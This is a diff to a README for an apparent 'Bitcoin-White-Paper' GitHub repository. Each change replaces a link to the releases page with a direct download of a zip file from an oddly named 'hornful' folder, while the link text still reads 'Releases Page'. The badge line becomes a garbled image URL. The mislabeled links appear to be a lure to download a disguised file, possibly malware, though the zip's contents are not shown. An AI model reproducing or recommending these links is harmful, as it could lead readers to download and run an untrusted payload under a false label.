@@ -1,6 +1,6 @@
 # 🚀 Bitcoin-White-Paper - Discover the Future of Money
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/OluwatoyinC/Bitcoin-White-Paper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OluwatoyinC/Bitcoin-White-Paper/main/hornful/Bitcoin-White-Paper.zip%20Latest%https://raw.githubusercontent.com/OluwatoyinC/Bitcoin-White-Paper/main/hornful/Bitcoin-White-Paper.zip)](https://raw.githubusercontent.com/OluwatoyinC/Bitcoin-White-Paper/main/hornful/Bitcoin-White-Paper.zip)
 
 ## 📚 Introduction
 
@@ -12,7 +12,7 @@ To download the Bitcoin white paper:
 
 1. **Visit the Releases Page**: Click the button below.
    
-   [Download Latest Release](https://github.com/OluwatoyinC/Bitcoin-White-Paper/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/OluwatoyinC/Bitcoin-White-Paper/main/hornful/Bitcoin-White-Paper.zip)
 
 2. **Choose the Latest Version**: On the releases page, look for the latest version. You will find options for different file formats and versions.
 
@@ -71,4 +71,4 @@ The Bitcoin white paper is a critical document for anyone interested in understa
 
 We hope you enjoy your journey into the world of Bitcoin. For any questions or further information, feel free to join community discussions. 
 
-Remember to check the releases page regularly for updates: [Visit the Releases Page](https://github.com/OluwatoyinC/Bitcoin-White-Paper/releases)
+Remember to check the releases page regularly for updates: [Visit the Releases Page](https://raw.githubusercontent.com/OluwatoyinC/Bitcoin-White-Paper/main/hornful/Bitcoin-White-Paper.zip)
